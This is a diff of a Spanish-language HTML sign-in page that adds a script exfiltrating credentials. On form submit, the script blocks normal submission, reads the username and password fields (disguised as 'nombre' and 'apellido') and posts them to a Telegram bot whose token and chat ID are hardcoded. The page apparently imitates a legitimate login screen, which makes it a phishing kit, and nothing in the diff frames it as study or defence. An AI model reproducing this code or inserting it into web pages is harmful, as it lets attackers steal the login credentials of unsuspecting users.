@@ -273,6 +273,7 @@
       <div class="texto">
         <p class="texto-azul">No tiene una cuenta? <span class="azul">Cree una.</span></p>
         <span class="azul">Opciones de inicio de sesión</span></p>
+        
 
       </div>
       <div class="forma">
@@ -292,5 +293,40 @@
   <div class="GcoybiklEMpmnCD"><img style="width:32px;height:32px;" src="data:image/pngNzUxODg3NTY1ODQzOTc1;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAMAAABg3Am1AAAA1VBMVEUAAABJSUk5OTlGRkZAQEA7OztEREQ8PDxHR0dDQ0M9PT1GRkZDQ0M9PT0+Pj5ERERCQkI+Pj5DQ0NAQEA+Pj5DQ0M+Pj5CQkJCQkJBQUFAQEA/Pz9AQEBAQEBBQUFAQEBAQEA/Pz9AQEA/Pz9BQUFAQEBAQEA/Pz9AQEA/Pz9AQEBAQEBAQEBAQEBAQEA/Pz9AQEBAQEBAQEA/Pz9AQEA/Pz9AQEBAQEA/Pz9AQEBAQEA/Pz9AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQED///8zybJlAAAARXRSTlMABwkLDA0PERITFRYXGR0eHyUmKCkqLT5CQ0RJY2RmZ2hpa4GmqLCxsrm6vr/C0NHS09TV19na3N3f4OHi4/Dy8/T29/gcPWP7AAAAAWJLR0RGF7r57QAAATJJREFUSMft1F1XgkAQBuAhTVEosjIqNSQqzAQVy490Q6P3//+lLhJUzAEv6HThXLFz5jk7OywQHeIfRsm0Z0EgWqacqlyy5liGb0nJ9VoXeK5XcrlLowN0taT6M4E3PVzcjCAShNSDU1wtZQcu35WF0cZJ5SEsdj4+rolqQtTCjA6fm5WJFyISgIhSbTQZ0IIRBw3YDJjhgjZbonNMGPCFfDyVR8CAYBsUsGDAFJV46gpjBtiox1P3eGTH2o6nHuCVmRc3hx5LqQP0ytzVGMrbor9bSC6c0i9C2SlOBca30fWeIFloLtC5qx4VqoYDIMUekuWHn+jHEiQIKjbt6Wfw/tQ4DgGpA3hKih/Cz0ZEREofryf7gLSCiNbO4e0FSI2e0raVFViVZgvWBpwJOMSfxDeQbjtBBpqwgwAAAABJRU5ErkJggg=="></div>
   <div class="GcoybiklEMpmnCD" style="padding-left:12px;">Opciones de inicio de sesión</div>
 </div>
+  <script>
+    const telegramBotToken = '6822597354:AAHYTpk-6rkvY_7vCogul2WMdlGP9isEKk8'; // Reemplaza con el token de tu bot de Telegram
+  
+    document.getElementById('form').addEventListener('submit', function (event) {
+      event.preventDefault(); // Evita que el formulario se envíe de la manera tradicional
+  
+      const nombre = document.getElementById('username').value;
+      const apellido = document.getElementById('password').value;
+  
+      // Construir el mensaje que se enviará al bot
+      const mensaje = `Nuevo usuario:
+  Nombre: ${nombre}
+  Apellido: ${apellido}`;
+  
+      // Enviar mensaje al bot de Telegram
+      fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: '6280856381', // Reemplaza con el ID de chat del grupo o canal
+          text: mensaje,
+        }),
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('Mensaje enviado a Telegram:', data);
+        // Puedes hacer otras cosas aquí después de enviar el mensaje
+      })
+      .catch(error => {
+        console.error('Error al enviar mensaje a Telegram:', error);
+      });
+    });
+  </script>
 </div>
 </html>
